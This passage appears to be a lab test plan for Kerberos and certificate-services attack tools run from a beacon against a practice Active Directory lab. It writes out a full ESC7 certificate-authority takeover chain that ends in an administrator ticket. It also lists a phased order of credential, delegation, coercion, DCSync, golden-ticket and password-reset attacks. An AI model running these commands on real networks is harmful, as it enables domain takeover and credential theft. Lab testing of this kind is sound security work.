**Expected output:** Forged certificate that can be used with krb_asktgt /certificate: for authentication

---

### cert_manageca - CA Management Operations
**Has CNA alias: NO - use inline-execute**

**Target:** viserys.targaryen has ManageCA privilege on ESSOS-CA (ESC7)
```
# List CA officers and permissions (run as viserys.targaryen context)
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA

# Add yourself as a CA officer (ESC7 step 1)
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA /addofficer:viserys.targaryen

# Enable the SubjectAltName (SAN) attribute (ESC6-style)
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA /enablesan

# Approve a pending certificate request (ESC7 step 2)
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA /approve:<REQUEST_ID>
```
**Expected output:** CA configuration changes or approval confirmations

**Full ESC7 Attack Chain:**
```
# 1. Add viserys as officer
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA /addofficer:viserys.targaryen

# 2. Enable SAN attribute
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA /enablesan

# 3. Request cert with SAN for administrator
cert_request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

# 4. If request is pending, approve it
inline-execute C:\tools\certify\bin\cert_manageca.x64.o /ca:braavos.essos.local\ESSOS-CA /approve:<REQUEST_ID>

# 5. Download the approved cert
inline-execute C:\tools\certify\bin\cert_download.x64.o /ca:braavos.essos.local\ESSOS-CA /id:<REQUEST_ID>

# 6. Use cert to get TGT as administrator
krb_asktgt /user:administrator /certificate:<BASE64_CERT> /domain:essos.local /dc:192.168.56.12 /ptt
```

---

### cert_pkiobjects - Enumerate PKI Objects
**Has CNA alias: NO - use inline-execute**
```
# Enumerate all PKI objects in AD (CAs, templates, OIDs, etc.)
inline-execute C:\tools\certify\bin\cert_pkiobjects.x64.o /domain:essos.local /dc:192.168.56.12

# Enumerate PKI objects in sevenkingdoms
inline-execute C:\tools\certify\bin\cert_pkiobjects.x64.o /domain:sevenkingdoms.local /dc:192.168.56.10

# Enumerate PKI objects in north
inline-execute C:\tools\certify\bin\cert_pkiobjects.x64.o /domain:north.sevenkingdoms.local /dc:192.168.56.11
```
**Expected output:** PKI container objects, enrollment services, NTAuth store, certificate templates in AD

---

## Suggested Testing Order

### Phase 1: No-Impact Enumeration (Safe)
```
1.  krb_delegenum           - Enumerate delegation configs (all 3 domains)
2.  krb_unconstrained_enum  - Find unconstrained delegation hosts
3.  krb_anonldap            - Anonymous LDAP on winterfell
4.  krb_stats               - Kerberos environment info
5.  krb_showall             - Full Kerberos dump
6.  krb_preauthscan         - Check preauth on known users
7.  cert_pkiobjects         - Enumerate PKI objects
```

### Phase 2: Ticket Operations (Read-Only)
```
8.  krb_asktgs              - Request service tickets
9.  krb_asktgtrc4           - TGT via NTLM hash
10. krb_ptt                 - Import tickets
11. krb_tgtdeleg            - TGT delegation trick
12. krb_renew               - Renew tickets
13. krb_harvest             - Harvest all TGTs
14. krb_monitor             - Monitor for new TGTs
15. krb_createnetonly        - Create sacrificial process
16. krb_pac                 - Inspect PAC data
17. krb_kirbi               - Convert to kirbi
18. krb_ccache              - Convert to ccache
19. krb_asrep2kirbi         - Convert AS-REP
20. krb_tgssub              - Service name substitution
21. krb_opsec               - OPSEC-safe operations
22. krb_kdcproxy            - KDC proxy test
```

### Phase 3: Credential Attacks
```
23. krb_asreproasting       - AS-REP roast (brandon.stark, missandei)
24. krb_brute               - Brute force (hodor:hodor)
25. krb_spray               - Password spray
```

### Phase 4: Delegation Abuse (Exploitation)
```
26. krb_s4u                 - S4U via jon.snow constrained delegation
27. krb_rbcd                - RBCD via stannis.baratheon
28. krb_bronzebit           - Bronze Bit on castelblack$
29. krb_u2u                 - User-to-User auth
30. krb_crossdomain         - Cross-domain referrals
```

### Phase 5: Coercion (Triggers Auth)
```
31. krb_printerbug          - SpoolService coercion
32. krb_petitpotam          - EFS coercion
```

### Phase 6: High-Impact (Requires DA)
```
33. krb_dcsync              - DCSync (as eddard.stark)
34. krb_golden              - Golden ticket (after krbtgt hash)
35. krb_silver              - Silver ticket
36. krb_diamond             - Diamond ticket
37. krb_nopac               - sAMAccountName spoofing
```

### Phase 7: ADCS Attacks
```
38. cert_pkiobjects         - PKI enumeration
39. cert_download           - Download issued certs
40. cert_manageca           - ESC7 (as viserys.targaryen)
41. cert_forge              - Golden certificate
```

### Phase 8: Account Changes (Destructive - Save for Last)
```
42. krb_changepw            - Change password
43. krb_resetpw             - Reset password
```

---

## Path Notes

Replace `C:\tools\kerbeus\bin\` and `C:\tools\certify\bin\` with your actual BOF path.
If BOFs are on the team server: `\\teamserver\share\kerbeus\bin\`
If BOFs are on the beacon host: `C:\Users\techn\Documents\bof_template\kerbeus\bin\`

For CNA-aliased commands, just type the command name directly in the beacon console.
